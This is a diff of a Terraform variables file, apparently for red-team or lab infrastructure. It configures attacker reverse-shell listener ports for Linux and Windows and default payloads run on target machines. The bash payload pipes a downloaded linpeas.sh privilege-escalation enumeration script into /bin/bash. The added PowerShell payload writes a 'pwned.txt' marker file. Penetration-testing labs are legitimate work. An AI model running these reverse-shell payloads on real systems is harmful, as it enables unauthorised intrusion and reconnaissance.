@@ -41,8 +41,14 @@ variable "listen_ip" {
 
 variable "listen_port" {
   type = number
-  description = "Port address of attacker"
+  description = "Port of attacker reverse shell for linux"
   default = 4444
+}
+
+variable "windows_listen_port" {
+  type = number
+  description = "Port of attacker reverse shell for windows"
+  default = 4445
 }
 
 variable "payload" {
@@ -50,6 +56,14 @@ variable "payload" {
   description = "The bash commands payload to execute when target machine connects"
   default = <<-EOT
             curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files
+            EOT
+}
+
+variable "windows_payload" {
+  type = string
+  description = "The powershell commands payload to execute when target machine connects"
+  default = <<-EOT
+            if (Test-Path "C:\Windows\Temp\pwned.txt") { (Get-Item "C:\Windows\Temp\pwned.txt").LastWriteTime = Get-Date } else { New-Item -ItemType File -Path "C:\Windows\Temp\pwned.txt" }
             EOT
 }
 
